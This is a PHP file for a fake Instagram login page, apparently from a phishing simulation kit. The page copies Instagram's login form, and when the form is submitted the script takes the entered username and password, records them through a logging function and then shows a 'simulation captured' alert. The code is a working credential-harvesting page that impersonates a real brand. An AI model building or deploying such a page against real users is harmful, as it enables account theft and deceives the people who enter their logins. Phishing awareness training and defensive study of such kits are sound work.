<?php
require __DIR__ . '/../../includes/config.php';
require __DIR__ . '/../../includes/functions.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';
    log_data("Instagram", ["username" => $user, "password" => $pass]);
    echo "<script>alert('Simulation captured! Check terminal logs.');window.location='index.php';</script>";
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="login-box">
    <h1>Instagram</h1>
    <form method="POST">
        <input type="text" name="username" placeholder="Phone number, username, or email"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <button type="submit">Log In</button>
    </form>
</div>
</body>
</html>
